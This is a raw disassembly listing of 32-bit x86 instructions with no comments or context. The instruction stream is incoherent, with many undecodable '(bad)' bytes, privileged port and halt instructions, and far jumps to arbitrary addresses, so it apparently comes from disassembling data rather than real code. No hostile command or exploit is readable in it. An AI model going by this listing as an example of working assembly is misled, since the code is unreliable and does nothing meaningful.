  41dd00:	xor    eax,0xf1ed7f3f
  41dd05:	xlat   BYTE PTR ds:[ebx]
  41dd06:	aas    
  41dd07:	or     cl,bh
  41dd09:	inc    ecx
  41dd0a:	arpl   WORD PTR [eax+0x8],di
  41dd0d:	sbb    al,0xe8
  41dd0f:	dec    edi
  41dd10:	ret    0xde8d
  41dd13:	lods   al,BYTE PTR ds:[esi]
  41dd14:	mov    esi,0x9cf7b6c6
  41dd19:	xor    al,0x27
  41dd1b:	rcr    ebx,1
  41dd1d:	shr    DWORD PTR [eax-0x3e467066],0x75
  41dd24:	lds    esi,FWORD PTR [ebp+0x74652d49]
  41dd2a:	popf   
  41dd2b:	xchg   BYTE PTR [eax-0x5f825446],cl
  41dd31:	pop    esi
  41dd32:	arpl   WORD PTR [eax+esi*2],cx
  41dd35:	or     BYTE PTR [ebp*1+0x6cc2ceef],0x6e
  41dd3d:	or     edi,edx
  41dd3f:	dec    ebp
  41dd40:	nop
  41dd41:	and    DWORD PTR [ecx+esi*8],ebp
  41dd44:	fld    QWORD PTR [edx+0x2e90b196]
  41dd4a:	scas   al,BYTE PTR es:[edi]
  41dd4b:	pop    es
  41dd4c:	xchg   esp,eax
  41dd4d:	mov    DWORD PTR [esi],ebp
  41dd4f:	jbe    0x41ddc4
  41dd51:	stos   BYTE PTR es:[edi],al
  41dd52:	popa   
  41dd53:	and    eax,0xdeb9e438
  41dd58:	or     eax,0xe4199c41
  41dd5d:	aaa    
  41dd5e:	sub    al,0xe0
  41dd60:	jp     0x41dd06
  41dd62:	int    0xf4
  41dd64:	xchg   esi,eax
  41dd65:	jbe    0x41dd9b
  41dd67:	mov    ?,WORD PTR cs:[edi-0x2a]
  41dd6b:	jno    0x41dd3f
  41dd6d:	jge    0x41ddc0
  41dd6f:	cmp    BYTE PTR ds:0x6fb24fb5,dl
  41dd75:	sbb    al,BYTE PTR [ebx]
  41dd77:	xor    BYTE PTR ds:[ebp-0x68a32459],dh
  41dd7e:	adc    BYTE PTR [eax+0x1758c66],cl
  41dd84:	xchg   BYTE PTR [ebp-0x4e971f18],cl
  41dd8a:	imul   DWORD PTR [ebx-0x7929fc95]
  41dd90:	fisubr DWORD PTR [eax+esi*2]
  41dd93:	mov    ah,0x24
  41dd95:	test   eax,0xe196c717
  41dd9a:	or     edi,ebp
  41dd9c:	or     esp,0xffffffaa
  41dd9f:	sub    bh,BYTE PTR [ebp-0x4637d1b7]
  41dda5:	dec    ebx
  41dda6:	aad    0x1a
  41dda8:	dec    esi
  41dda9:	xchg   edi,eax
  41ddaa:	push   esp
  41ddab:	xor    edi,DWORD PTR [esi]
  41ddad:	hlt    
  41ddae:	das    
  41ddaf:	jno    0x41dd58
  41ddb1:	xlat   BYTE PTR ds:[ebx]
  41ddb2:	shl    DWORD PTR [edx],0xd3
  41ddb5:	(bad)  
  41ddb6:	scas   al,BYTE PTR es:[edi]
  41ddb7:	loop   0x41dd44
  41ddb9:	stos   BYTE PTR es:[edi],al
  41ddba:	dec    ebx
  41ddbb:	gs add ah,dh
  41ddbe:	lods   eax,DWORD PTR ds:[esi]
  41ddbf:	jb     0x41dddc
  41ddc1:	jno    0x41de3f
  41ddc3:	push   es
  41ddc4:	push   eax
  41ddc5:	adc    al,bh
  41ddc7:	lock jne 0x41ddd9
  41ddca:	lods   al,BYTE PTR ds:[esi]
  41ddcb:	dec    ebp
  41ddcc:	xchg   esi,eax
  41ddcd:	mov    al,cl
  41ddcf:	or     bl,BYTE PTR [edi-0x10]
  41ddd2:	cmp    eax,0x6d5d26b4
  41ddd7:	adc    ebp,ebx
  41ddd9:	sub    al,0x0
	...
  41dde7:	adc    al,0x94
  41dde9:	xchg   esp,eax
  41ddea:	or     DWORD PTR [ecx+ecx*1-0x5d326263],edx
  41ddf1:	enter  0x5aa2,0xd9
  41ddf5:	xchg   ebx,eax
  41ddf6:	(bad)  
  41ddf7:	arpl   WORD PTR [ebx+0x22b0001],bp
  41ddfd:	add    BYTE PTR [eax],al
  41ddff:	cld    
  41de00:	push   cs
  41de01:	push   eax
  41de02:	dec    edi
  41de03:	xchg   esp,eax
  41de04:	jns    0x41de50
  41de06:	dec    edx
  41de07:	out    dx,eax
  41de08:	pop    ebp
  41de09:	jbe    0x41ddce
  41de0b:	push   es
  41de0c:	imul   ebp,DWORD PTR [ebx-0x7a],0x5ddab55b
  41de13:	lea    ebx,[eax-0x7a2b5417]
  41de19:	push   es
  41de1a:	push   ds
  41de1b:	or     BYTE PTR [esi+0x49237af],ch
  41de21:	jne    0x41de94
  41de23:	mov    edi,eax
  41de25:	popa   
  41de26:	mov    ds:0xb05a9605,eax
  41de2b:	sbb    al,0xb2
  41de2d:	(bad)  
  41de2e:	loopne 0x41de04
  41de30:	mov    dl,0xde
  41de32:	adc    bl,BYTE PTR [eax-0x49]
  41de35:	rcl    BYTE PTR [eax-0x5479f2c4],1
  41de3b:	es ss sub eax,0xc0bccb0c
  41de42:	jns    0x41debe
  41de44:	aaa    
  41de45:	mov    al,ds:0xf1b13192
  41de4a:	mov    ecx,DWORD PTR [ebx-0x6f1609a9]
  41de50:	sbb    DWORD PTR [edx+0x686d35fc],0x219cf665
  41de5a:	ja     0x41deac
  41de5c:	pop    edx
  41de5d:	jbe    0x41de74
  41de5f:	xor    al,0xa9
  41de61:	xchg   edi,eax
  41de62:	loopne 0x41deaa
  41de64:	aas    
  41de65:	hlt    
  41de66:	pop    ebp
  41de67:	mov    bh,0x7
  41de69:	mov    eax,ds:0x6d295a58
  41de6e:	mov    eax,0xab80c7fa
  41de73:	fucomip st,st(2)
  41de75:	push   ecx
  41de76:	sub    eax,0xcab753a0
  41de7b:	sbb    eax,0x15113e5b
  41de80:	fnstenv [ebx-0x17f09128]
  41de86:	mov    ds:0x137cae2e,al
  41de8b:	dec    esi
  41de8c:	fcom   DWORD PTR ds:0x261b9977
  41de92:	sbb    bl,BYTE PTR [esi+0x66]
  41de95:	gs stos DWORD PTR es:[edi],eax
  41de97:	mov    ds:0x4eb8d704,al
  41de9c:	test   al,0xc7
  41de9e:	and    esi,0x6d
  41dea1:	add    eax,0x9b66738f
  41dea6:	pushf  
  41dea7:	mov    bl,0x25
  41dea9:	rol    DWORD PTR [ebx+0x72],cl
  41deac:	xchg   ebx,eax
  41dead:	cs sub eax,0x4aabedf6
  41deb3:	pop    ss
  41deb4:	sbb    BYTE PTR [ecx-0x3ed68290],bh
  41deba:	in     eax,dx
  41debb:	cmp    al,0x6c
  41debd:	adc    al,0xfc
  41debf:	mov    edx,0x27ba6fe5
  41dec4:	stos   BYTE PTR es:[edi],al
  41dec5:	pop    ds
  41dec6:	mov    eax,0xc73a8c05
  41decb:	adc    ebx,esp
  41decd:	(bad)  
  41dece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41decf:	mov    ecx,0x2178fd5a
  41ded4:	mov    dl,0x8c
  41ded6:	add    al,0xca
  41ded8:	retf   
  41ded9:	mov    esp,0x1a41e44f
  41dede:	sub    esi,DWORD PTR fs:0x2d18d0fc
  41dee5:	xor    eax,0xa64f074
  41deea:	scas   eax,DWORD PTR es:[edi]
  41deeb:	ss cmc 
  41deed:	fstp   DWORD PTR [ebx-0x5d157e0e]
  41def3:	and    al,0x80
  41def5:	or     al,0xe6
  41def7:	mov    BYTE PTR [ebp+0x3d7c247f],bl
  41defd:	jae    0x41deed
  41deff:	pop    ebx
  41df00:	sub    bl,al
  41df02:	push   0xffffffc4
  41df04:	mov    ds:0x8e0dbc65,al
  41df09:	cmp    eax,0x54fb8148
  41df0e:	pop    ecx
  41df0f:	and    DWORD PTR [ebx-0x70570be1],ebx
  41df15:	sbb    bl,BYTE PTR [ebx+0x59]
  41df18:	jo     0x41df0f
  41df1a:	sbb    dl,dl
  41df1c:	mov    ds:0x5ff5d8e,al
  41df21:	(bad)  
  41df22:	hlt    
  41df23:	outs   dx,BYTE PTR ds:[esi]
  41df24:	in     eax,0x31
  41df26:	and    esi,DWORD PTR [ebx-0x2c5f7cb8]
  41df2c:	ret    
  41df2d:	gs loope 0x41df28
  41df30:	ins    DWORD PTR es:[edi],dx
  41df31:	ret    0xdaa1
  41df34:	push   edi
  41df35:	or     eax,0xa4ebd651
  41df3a:	fwait
  41df3b:	mov    bh,0x72
  41df3d:	xor    eax,0xb801fd95
  41df42:	adc    esi,0xffffffdd
  41df45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df46:	cmc    
  41df47:	ret    
  41df48:	sub    edi,DWORD PTR [edi]
  41df4a:	cmp    al,0x29
  41df4c:	pop    edx
  41df4d:	fiadd  DWORD PTR ds:0x4138f0b2
  41df53:	mov    cl,0x4b
  41df55:	pop    ebp
  41df56:	and    edx,DWORD PTR [esp+edx*1]
  41df59:	mov    esi,0x81ad3138
  41df5e:	in     eax,0x27
  41df60:	std    
  41df61:	xchg   ebp,eax
  41df62:	jmp    0x6524:0x2fb2f167
  41df69:	xchg   esp,eax
  41df6a:	xchg   BYTE PTR [ecx-0x7d654f1d],cl
  41df70:	aas    
  41df71:	call   0xec501335
  41df76:	mov    al,0xf3
  41df78:	fbstp  TBYTE PTR [edi-0x7b]
  41df7b:	int    0x91
  41df7d:	add    bh,bh
  41df7f:	(bad)  
  41df80:	std    
  41df81:	call   0x6dc8:0xedc68330
  41df88:	mov    edi,0xe866afc1
  41df8d:	xor    BYTE PTR [ebx+eiz*8+0x7389ecb8],bh
  41df94:	inc    eax
  41df95:	pop    esp
  41df96:	push   edx
  41df97:	push   ds
  41df98:	inc    esi
  41df99:	out    dx,al
  41df9a:	stos   DWORD PTR es:[edi],eax
  41df9b:	xchg   edi,eax
  41df9c:	push   0xffffff88
  41df9e:	sub    eax,0x17a6bb79
  41dfa3:	add    ch,bh
  41dfa5:	push   esp
  41dfa6:	push   edx
  41dfa7:	jne    0x41dfdc
  41dfa9:	mov    bh,dh
  41dfab:	addr16 jo 0x41e005
  41dfae:	mov    cl,0x80
  41dfb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfb1:	sar    DWORD PTR ds:0x80a0a66b,1
  41dfb7:	push   ebx
  41dfb8:	push   edi
  41dfb9:	xchg   edi,eax
  41dfba:	inc    ecx
  41dfbb:	in     eax,0x5
  41dfbd:	cmp    DWORD PTR [ecx+0x2e3610a0],0xffffffcb
  41dfc4:	sbb    eax,0xc7c5fcef
  41dfc9:	sti    
  41dfca:	xchg   al,ah
  41dfcc:	cmp    BYTE PTR cs:[si-0x6a],dl
  41dfd1:	(bad)  
  41dfd2:	fdivr  DWORD PTR [ebx]
  41dfd4:	cld    
  41dfd5:	imul   ebp,esi,0x7702a91
  41dfdb:	cli    
  41dfdc:	loop   0x41dff0
  41dfde:	or     BYTE PTR [esi-0x59],0x17
  41dfe2:	add    bl,BYTE PTR [edi+0x776088da]
  41dfe8:	ret    0x8905
  41dfeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfec:	cld    
  41dfed:	cmp    dl,BYTE PTR [eax-0x53f92d1b]
  41dff3:	daa    
  41dff4:	ja     0x41dfbc
  41dff6:	fistp  DWORD PTR [ebx-0x2f]
  41dff9:	jmp    0x6848:0x3869657b
  41e000:	je     0x41e030
  41e002:	sbb    cl,BYTE PTR ss:[ebx-0x3fb6111b]
  41e009:	inc    esi
  41e00a:	xor    DWORD PTR [edx],esp
  41e00c:	pop    ebp
  41e00d:	sbb    esp,DWORD PTR [eax-0x71]
  41e010:	std    
  41e011:	pusha  
  41e012:	mov    ch,0xa6
  41e014:	add    BYTE PTR [ecx],ah
  41e016:	cdq    
  41e017:	mov    ch,0x27
  41e019:	adc    DWORD PTR [eax+0x2b40c416],esp
  41e01f:	movd   mm0,ebx
  41e022:	mov    ebx,edi
  41e024:	int3   
  41e025:	jo     0x41e072
  41e027:	cmp    esi,eax
  41e029:	mov    al,0x0
	...
  41e037:	cmp    DWORD PTR [edx-0x66],edx
  41e03a:	mov    ch,0xfb
  41e03c:	std    
  41e03d:	aas    
  41e03e:	fimul  WORD PTR [ecx]
  41e040:	sar    DWORD PTR [ebx+0xae81c0d],1
  41e046:	xchg   DWORD PTR [esi+0x2b0001ad],ecx
  41e04c:	add    al,BYTE PTR [eax]
  41e04e:	add    BYTE PTR [edx-0x6c],dl
  41e051:	ja     0x41e053
  41e053:	mov    ebx,0xda9a44dc
  41e058:	mov    ah,0x87
  41e05a:	or     BYTE PTR [edx+0x31],ah
  41e05d:	loope  0x41e019
  41e05f:	cli    
  41e060:	pop    edi
  41e061:	xlat   BYTE PTR ds:[ebx]
  41e062:	inc    edi
  41e063:	push   ebp
  41e064:	cmp    eax,0x3ab3ea82
  41e069:	fstp   QWORD PTR [edi-0x41104b5c]
  41e06f:	jns    0x41e02c
  41e071:	pop    ebp
  41e072:	push   esi
  41e073:	mov    ebx,0xc60f3d73
  41e078:	test   dh,ah
  41e07a:	xchg   edx,eax
  41e07b:	cli    
  41e07c:	xor    ah,BYTE PTR [ecx+ecx*1+0x14d742f0]
  41e083:	cmc    
  41e084:	pushf  
  41e085:	out    dx,eax
  41e086:	arpl   WORD PTR [ecx],bp
  41e088:	pop    ds
  41e089:	push   edx
  41e08a:	cmp    al,0x18
  41e08c:	pop    ebx
  41e08d:	push   ds
  41e08e:	mov    esi,0x44861fa1
  41e093:	lea    esp,ds:0xa9bdbe38
  41e099:	popf   
  41e09a:	cdq    
  41e09b:	pushf  
  41e09c:	sbb    DWORD PTR [esi+esi*1],ecx
  41e09f:	ins    BYTE PTR es:[edi],dx
  41e0a0:	dec    ecx
  41e0a1:	and    ah,BYTE PTR [ecx]
  41e0a3:	or     BYTE PTR [eax-0x2be30c74],dl
  41e0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0aa:	mov    dl,0x79
  41e0ac:	xor    eax,DWORD PTR [ebp+0x4edd8813]
  41e0b2:	mov    ebp,0xfc6c876e
  41e0b7:	loope  0x41e0c0
  41e0b9:	(bad)  
  41e0ba:	imul   eax,DWORD PTR [edx-0x553ae45],0x7aae503e
  41e0c4:	xchg   ebp,eax
  41e0c5:	fucomi st,st(4)
  41e0c7:	arpl   WORD PTR [ebx-0x42c8b4c8],si
  41e0cd:	jl     0x41e09e
  41e0cf:	push   0xc6fbc64
  41e0d4:	rcl    BYTE PTR [ecx-0x72097309],0x77
  41e0db:	xchg   DWORD PTR [eax*4+0x2b9633dc],eax
  41e0e2:	dec    edi
  41e0e3:	xor    cl,BYTE PTR [eax-0x70]
  41e0e6:	repnz adc BYTE PTR [ecx+ecx*8-0x7],bh
  41e0eb:	nop
  41e0ec:	clc    
  41e0ed:	cmp    al,0x85
  41e0ef:	add    eax,0x85d845a9
  41e0f4:	mov    dh,0x65
  41e0f6:	scas   al,BYTE PTR es:[edi]
  41e0f7:	xor    DWORD PTR [ebx+0x68],edx
  41e0fa:	loopne 0x41e099
  41e0fc:	and    BYTE PTR [ebx+0x4a5ea102],cl
  41e102:	pop    ss
  41e103:	mov    esp,0x69dc23ee
  41e108:	lds    ebx,FWORD PTR ds:0xae187048
  41e10e:	(bad)  
  41e10f:	jnp    0x41e0de
  41e111:	jmp    0x41e124
  41e113:	xchg   ebx,eax
  41e114:	pop    ebx
  41e115:	lock dec edx
  41e117:	sub    BYTE PTR [edx-0x7873c42d],bh
  41e11d:	out    0x82,al
  41e11f:	xor    al,0x62
  41e121:	ror    BYTE PTR [edi+ecx*4+0x11],1
  41e125:	and    ebp,ebp
  41e127:	lods   al,BYTE PTR ds:[esi]
  41e128:	iret   
  41e129:	push   0xffffffb6
  41e12b:	pushf  
  41e12c:	in     eax,dx
  41e12d:	mov    edx,0x62d74cd6
  41e132:	lods   al,BYTE PTR ds:[esi]
  41e133:	iret   
  41e134:	cmp    DWORD PTR [edi-0x7ba5c3a0],ebp
  41e13a:	daa    
  41e13b:	sahf   
  41e13c:	cld    
  41e13d:	pop    ebx
  41e13e:	or     BYTE PTR [edi-0x1dc3d10e],ch
  41e144:	push   0xc0ee5ada
  41e149:	jb     0x41e19a
  41e14b:	test   eax,0x6dc03f36
  41e150:	mov    cl,0xb4
  41e152:	js     0x41e144
  41e154:	ja     0x41e155
  41e156:	or     al,0x14
  41e158:	xor    BYTE PTR [esi-0x70],cl
  41e15b:	and    al,0x3c
  41e15d:	test   eax,0xa2a6dd4c
  41e162:	fucomip st,st(6)
  41e164:	push   es
  41e165:	int3   
  41e166:	cmp    eax,0x67c88bb6
  41e16b:	cmp    DWORD PTR [ecx+0x2fa07b29],ecx
  41e171:	test   eax,0x42be78d5
  41e176:	fldz   
  41e178:	ins    DWORD PTR es:[edi],dx
  41e179:	sub    ch,ah
  41e17b:	call   0xb171e617
  41e180:	lods   eax,DWORD PTR ds:[esi]
  41e181:	scas   eax,DWORD PTR es:[edi]
  41e182:	mov    dl,0x4c
  41e184:	call   DWORD PTR [ecx-0x3c]
  41e187:	mov    edi,0x4bf8b6f9
  41e18c:	push   ebx
  41e18d:	cmp    ecx,DWORD PTR [edx]
  41e18f:	addr16 push eax
  41e191:	das    
  41e192:	aam    0x23
  41e194:	jl     0x41e150
  41e196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e197:	(bad)  
  41e199:	lahf   
  41e19a:	mov    cl,0x41
  41e19c:	cwde   
  41e19d:	test   al,0x5b
  41e1a0:	mov    WORD PTR [ecx],fs
  41e1a2:	mov    ds:0xcb813f34,al
  41e1a7:	aad    0xe6
  41e1a9:	inc    ecx
  41e1aa:	push   ss
  41e1ab:	mov    bl,0xa
  41e1ad:	ss push cs
  41e1af:	inc    ecx
  41e1b0:	jmp    0x4b463b7a
  41e1b5:	test   ah,bl
  41e1b7:	push   es
  41e1b8:	cs mov edx,0xd965bf92
  41e1be:	xrelease mov DWORD PTR [ebx+0x1f8f38ac],ecx
  41e1c5:	call   0x29a76574
  41e1ca:	lea    esi,[edi+0x11]
  41e1cd:	sbb    BYTE PTR [edi],bl
  41e1cf:	push   esp
  41e1d0:	sub    ebx,eax
  41e1d2:	jbe    0x41e1b9
  41e1d4:	mov    esp,0xf393868f
  41e1d9:	jmp    0x5f0d3c5b
  41e1de:	jnp    0x41e208
  41e1e0:	mov    dl,0xeb
  41e1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e3:	mul    DWORD PTR [eax]
  41e1e5:	addr16 mov ebp,0x8ecaf43f
  41e1eb:	xor    BYTE PTR [ebx],dh
  41e1ed:	pop    esp
  41e1ee:	and    dl,BYTE PTR [ebx-0x1aee000]
  41e1f4:	jmp    0x41ec2d1b
  41e1f9:	jns    0x41e225
  41e1fb:	xor    cl,cl
  41e1fd:	pop    es
  41e1fe:	mov    ah,0xe
  41e200:	fcmovbe st,st(1)
  41e202:	lahf   
  41e203:	neg    DWORD PTR [eax-0x5282c57b]
  41e209:	mov    ds:0x51742c41,al
  41e20e:	test   BYTE PTR [esi+eiz*2],bh
  41e211:	scas   eax,DWORD PTR es:[edi]
  41e212:	push   ebp
  41e213:	mov    esp,0xedb4cbe6
  41e218:	mov    dl,0x90
  41e21a:	lea    ecx,[ebx+0x32f4e47f]
  41e220:	push   ss
  41e221:	lods   eax,DWORD PTR ds:[esi]
  41e222:	lahf   
  41e223:	gs shl al,1
  41e226:	mov    ecx,0x1df3e4ae
  41e22b:	test   al,0xf5
  41e22d:	cmp    esp,DWORD PTR [edx]
  41e22f:	mov    WORD PTR [eax-0x73],?
  41e232:	pop    edi
  41e233:	push   ebp
  41e234:	(bad)  
  41e235:	add    edi,DWORD PTR [ebx]
  41e237:	sub    esi,DWORD PTR [edi]
  41e239:	or     eax,0xbbebe31a
  41e23e:	xchg   esp,eax
  41e23f:	mov    cl,0x19
  41e241:	clc    
  41e242:	sub    DWORD PTR [ecx*4-0x64ac6165],edi
  41e249:	arpl   bp,si
  41e24b:	mov    eax,ds:0xfa4f99a1
  41e250:	retf   0xae8c
  41e253:	nop
  41e254:	lahf   
  41e255:	xchg   edi,eax
  41e256:	rol    BYTE PTR [esi+0x66d7cad4],1
  41e25c:	or     DWORD PTR [ecx-0x4253529c],edx
  41e262:	pop    es
  41e263:	pushf  
  41e264:	mov    eax,0x710c030
  41e269:	clc    
  41e26a:	stos   BYTE PTR es:[edi],al
  41e26b:	cmp    DWORD PTR [edx-0x7d],esi
  41e26e:	xchg   esi,eax
  41e26f:	fcomp  QWORD PTR [ebx+0x7c]
  41e272:	cwde   
  41e273:	jb     0x41e2b9
  41e275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e276:	or     BYTE PTR [ebp-0x53],0xa3
	...
  41e286:	add    BYTE PTR [edi-0x10855437],ah
  41e28c:	jp     0x41e285
  41e28e:	fucom  st(0)
  41e290:	mov    cl,0xc2
  41e292:	and    bl,ah
  41e294:	cmp    al,0xe1
  41e296:	cmp    DWORD PTR [ecx+0x2b0001af],edi
  41e29c:	add    al,BYTE PTR [eax]
  41e29e:	add    bh,ch
  41e2a0:	sbb    BYTE PTR [ebp-0x5c],0xc3
  41e2a4:	retf   0xa225
  41e2a7:	popf   
  41e2a8:	aam    0x79
  41e2aa:	fs add al,0xdf
  41e2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2ae:	mov    esi,0x983a810d
  41e2b3:	pop    ebx
  41e2b4:	jmp    0x41e258
  41e2b6:	pop    eax
  41e2b7:	(bad)  
  41e2b8:	pushf  
  41e2b9:	push   ecx
  41e2ba:	mov    al,ds:0xb8aa4c65
  41e2bf:	cmc    
  41e2c0:	lds    ebp,FWORD PTR [ebp+ebx*4-0x2c863bac]
  41e2c7:	push   cs
  41e2c8:	fwait
  41e2c9:	xchg   edi,eax
  41e2ca:	mov    eax,0x2631feeb
  41e2cf:	lods   eax,DWORD PTR ds:[esi]
  41e2d0:	mov    ds:0xc704b83f,eax
  41e2d5:	retf   0xca2
  41e2d8:	popf   
  41e2d9:	sub    al,BYTE PTR [eax+0x2932ad0d]
  41e2df:	sahf   
  41e2e0:	cmp    BYTE PTR [esi],0x6b
  41e2e3:	test   DWORD PTR [eax-0x29],0x299db09f
  41e2ea:	or     BYTE PTR [ebx],ah
  41e2ec:	pop    edi
  41e2ed:	xchg   DWORD PTR [ebp-0x69febac1],ecx
  41e2f3:	cwde   
  41e2f4:	js     0x41e310
  41e2f6:	mov    ds:0x7e4a90f2,eax
  41e2fb:	jno    0x41e297
  41e2fd:	cs inc esi
  41e2ff:	inc    edi
  41e300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e301:	(bad)  
  41e303:	(bad)  
  41e304:	push   eax
  41e305:	in     al,dx
  41e306:	push   ds
  41e307:	xor    ah,al
  41e309:	inc    edx
  41e30a:	push   cs
  41e30b:	mov    edi,DWORD PTR ds:0x3af14659
  41e311:	int3   
  41e312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e313:	lea    esi,[ebp+0x72d8e1bf]
  41e319:	xchg   esp,eax
  41e31a:	int3   
  41e31b:	clc    
  41e31c:	inc    esp
  41e31d:	and    DWORD PTR [edi+eax*1+0x584cc881],0x26
  41e325:	aam    0x56
  41e327:	sbb    eax,0x7337d2e0
  41e32c:	out    0x6e,eax
  41e32e:	dec    esi
  41e32f:	sar    BYTE PTR [edi+0x53f6084d],0xb5
  41e336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e337:	jbe    0x41e378
  41e339:	jno    0x41e346
  41e33b:	xor    BYTE PTR [ebp+0x55254792],0x5d
  41e342:	dec    ecx
  41e344:	add    al,0x98
  41e346:	or     dl,bh
  41e348:	ror    DWORD PTR [ebx+0x2e],1
  41e34b:	inc    edx
  41e34c:	jecxz  0x41e3b5
  41e34e:	cmp    DWORD PTR [ecx],ecx
  41e350:	or     cl,ah
  41e352:	iret   
  41e353:	mov    ch,0x18
  41e355:	pop    eax
  41e356:	push   ss
  41e357:	mov    edi,0xa5abf953
  41e35c:	fcomp  st(6)
  41e35e:	dec    ebx
  41e35f:	pusha  
  41e360:	mov    esp,0x5155a7b2
  41e365:	outs   dx,BYTE PTR ds:[esi]
  41e366:	mov    cl,0x23
  41e368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e369:	fst    QWORD PTR [edx-0x63a9b842]
  41e36f:	sti    
  41e370:	ins    BYTE PTR es:[edi],dx
  41e371:	lock scas eax,DWORD PTR es:[edi]
  41e373:	ret    0xd161
  41e376:	inc    ebx
  41e377:	or     DWORD PTR ds:0x2fb38f31,edi
  41e37d:	leave  
  41e37e:	or     dh,bh
  41e380:	mov    edx,0x11487824
  41e385:	jmp    0x41e327
  41e387:	iret   
  41e388:	out    0xbe,al
  41e38a:	out    dx,eax
  41e38b:	lods   eax,DWORD PTR ds:[esi]
  41e38c:	and    bl,BYTE PTR [ebx]
  41e38e:	mov    ds:0x90cafb17,al
  41e393:	add    BYTE PTR cs:[ecx+0x6d],bh
  41e397:	add    bh,dh
  41e399:	pop    edi
  41e39a:	jmp    0x41e3fe
  41e39c:	mov    ebx,DWORD PTR [edi]
  41e39e:	pop    ds
  41e39f:	sbb    eax,0xafccb50b
  41e3a4:	sar    DWORD PTR [esi+0xd],1
  41e3a7:	call   0xca2de950
  41e3ac:	dec    ebp
  41e3ad:	retf   0x6ee
  41e3b0:	adc    bl,BYTE PTR [edx]
  41e3b2:	lea    ebx,[edi+ebx*2-0x2b8f3d17]
  41e3b9:	outs   dx,DWORD PTR ds:[esi]
  41e3ba:	sbb    ch,bl
  41e3bc:	cmp    bh,ch
  41e3be:	pusha  
  41e3bf:	test   DWORD PTR [esi-0x44],edx
  41e3c2:	xchg   DWORD PTR [ebx],esp
  41e3c4:	fistp  DWORD PTR [edx]
  41e3c6:	push   edi
  41e3c7:	xchg   edi,eax
  41e3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3c9:	or     eax,0xe50683
  41e3ce:	push   0xffffffcd
  41e3d0:	sub    bl,al
  41e3d2:	jmp    0x41e35d
  41e3d4:	aad    0xbc
  41e3d6:	xchg   BYTE PTR [edx],ch
  41e3d8:	xchg   esp,eax
  41e3d9:	adc    edx,esp
  41e3db:	xor    esi,DWORD PTR [esi]
  41e3dd:	or     al,0x4a
  41e3df:	fimul  WORD PTR [edx-0x45]
  41e3e2:	mov    eax,ds:0xae8f236c
  41e3e7:	mov    ds:0x9776c49f,al
  41e3ec:	outs   dx,DWORD PTR ds:[esi]
  41e3ed:	pop    ss
  41e3ee:	ss jl  0x41e46b
  41e3f1:	jnp    0x41e392
  41e3f3:	mov    edx,0xe035afcf
  41e3f8:	mov    bl,BYTE PTR [eax-0x4b047ca6]
  41e3fe:	xor    bl,BYTE PTR [ecx-0x54]
  41e401:	dec    edi
  41e402:	mov    al,ds:0x32085a47
  41e407:	inc    esi
  41e408:	pop    eax
  41e409:	pop    ebx
  41e40a:	or     al,0x2a
  41e40c:	mov    dl,0x32
  41e40e:	repz mov esp,0xa9bcfb5c
  41e414:	aaa    
  41e415:	mov    ds:0xd1cadf14,al
  41e41a:	mov    al,0xd0
  41e41c:	and    eax,0x4005b48
  41e421:	jp     0x41e3e1
  41e423:	mov    edx,0x4f3db991
  41e428:	dec    ebp
  41e429:	mov    ecx,ecx
  41e42b:	xchg   edx,eax
  41e42c:	cdq    
  41e42d:	xchg   edx,eax
  41e42e:	jbe    0x41e3b3
  41e430:	sahf   
  41e431:	inc    edx
  41e432:	cmp    eax,0x943cc36
  41e437:	sub    DWORD PTR [eax],esp
  41e439:	push   es
  41e43a:	pop    ebx
  41e43b:	les    edx,FWORD PTR [edx+0x1a]
  41e43e:	cmp    BYTE PTR ds:0x11e83a6a,dh
  41e444:	hlt    
  41e445:	pop    ebp
  41e446:	cmp    dl,BYTE PTR [edx+0x1cfc9321]
  41e44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44d:	fild   WORD PTR [edi+0x3b84e556]
  41e453:	mov    bl,0x46
  41e455:	cdq    
  41e456:	mov    ebp,0x1d95b87
  41e45b:	mov    esi,0xe01af77b
  41e460:	std    
  41e461:	(bad)  
  41e462:	fbld   TBYTE PTR ds:0xe0131a86
  41e468:	mov    bh,0xfd
  41e46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e46b:	jae    0x41e4db
  41e46d:	iret   
  41e46e:	cmova  eax,DWORD PTR [esi-0x3d]
  41e472:	push   ebp
  41e473:	dec    edx
  41e474:	mov    ebp,0xfd1a05a9
  41e479:	xchg   ebp,eax
  41e47a:	test   eax,0x63298812
  41e47f:	push   esi
  41e480:	push   ds
  41e481:	cmp    bh,BYTE PTR [ebx+0x67]
  41e484:	dec    esp
  41e485:	mov    esp,0x51b7ba0c
  41e48a:	adc    ch,BYTE PTR [ebx+0x5d901d50]
  41e490:	mov    al,ds:0xc4178fe2
  41e495:	inc    esp
  41e496:	pop    ds
  41e497:	xchg   ebx,eax
  41e498:	mov    cl,0xba
  41e49a:	out    dx,eax
  41e49b:	into   
  41e49c:	jle    0x41e4c6
  41e49e:	or     BYTE PTR [eax-0x7a],0x77
  41e4a2:	stos   BYTE PTR es:[edi],al
  41e4a3:	mov    ds:0x9e19360c,al
  41e4a8:	jmp    0x41e46e
  41e4aa:	push   edx
  41e4ab:	xor    BYTE PTR [ecx+0x55],bh
  41e4ae:	jbe    0x41e52a
  41e4b0:	adc    dl,BYTE PTR [eax]
  41e4b2:	fmul   QWORD PTR [ecx+ebx*8-0x4f]
  41e4b6:	retf   0x8ffa
  41e4b9:	xor    BYTE PTR [ecx],ah
  41e4bb:	inc    ecx
  41e4bc:	jno    0x41e521
  41e4be:	and    dh,BYTE PTR [edi+0x6a46d62d]
  41e4c4:	mov    edi,0x9c5090a
  41e4c9:	retf   0x0
	...
